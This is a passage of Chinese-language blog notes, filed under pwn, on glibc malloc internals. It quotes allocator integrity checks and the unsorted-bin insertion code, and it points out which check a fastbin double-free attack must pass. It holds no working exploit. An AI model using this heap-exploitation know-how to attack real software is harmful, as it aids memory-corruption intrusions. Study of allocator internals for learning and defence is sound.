数组中相应的块标记为空。</p><p><code>get_binmap</code> 宏接受一个指向 <code>malloc_state</code> 结构体的指针 <code>m</code> 和一个整数 <code>i</code>，它返回 <code>binmap</code> 数组中相应块的二进制位，这个值表示该块是否为空闲块。</p><h2 id="重要函数片段"><a href="#重要函数片段" class="headerlink" title="重要函数片段"></a>重要函数片段</h2><h3 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (victim));</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastbin中取chunk时,判断chunk大小是否与当前fastbin大小匹配,实现是通过得到victim地大小,然后再由该大小得到真正地index,查看是否与idx相同</p><p>是Fastbin Double Free需要通过地一个验证</p><h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">  &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>free过程中,用于检测要释放的chunk的nextchunk的大小是否合规,防止内存泄露或内存越界等问题.</p><p>system_mem一般为132k</p><h3 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mark_bin (av, victim_index);  <span class="comment">//chunk有属于这个标号的,那最后这个bin总不会为空对吧</span></span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>在unsortedbin中取chunk时,最后将该chunk插入的操作</p><h2 id="困惑"><a href="#困惑" class="headerlink" title="困惑"></a>困惑</h2><details class="folding-tag" green><summary> bins数组的双向链表是如何实现的[已解决] </summary>              <div class='content'>              <p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-16_231042.png" alt=""></p><p>从上图可以看到，每个small bin使用了bins array中的两个元素，以0、1、2、3四个元素为例，<strong><em>代码中把这部分空间强制转换成malloc_chunk类型</em></strong>，这样根据malloc_chunk数据结构的定义，3、4两个元素就对应了malloc_chunk中的fd、bk指针，它们作为第一个small bin的表头，分别用来指向forward和backward方向的malloc_chunk，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-16_230420.png" alt=""></p><p>强制类型转换真的很重要</p>              </div>            </details><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>最后，堆的学习着实需要耐心，本人就是中途无数次摆烂，还总是被各种细节困惑，但只要坚持总是能入门的，另外有时遇到不懂又搜不到的知识点，不妨问问chatgpt或newbing之类的ai，虽然基本十个错九个（主要是gpt，bing不懂的它不会瞎答），但总是能给个方向。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
